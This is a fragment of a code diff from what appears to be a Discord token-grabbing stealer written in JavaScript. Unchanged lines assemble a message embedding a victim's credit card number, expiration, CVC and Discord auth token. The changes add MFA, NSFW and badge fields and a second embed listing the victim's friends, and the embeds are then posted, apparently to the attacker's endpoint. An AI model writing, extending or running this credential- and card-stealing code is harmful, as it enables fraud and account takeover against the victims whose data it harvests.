+                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
+                **NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(user.nsfw_allowed)}\n
+                **Badges** <:badge:1041634538150973460>\n${GetBadges(user.flags)}\n
                 **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
                 **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
                 **CVC**\n\`\`\`${CardCVC}\`\`\`\n
-                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
                 <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
                 thumbnail: userAvatar,
                 image: userBanner
             })
 
-            params.embeds.push()
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
             await post(params)
             break
     }
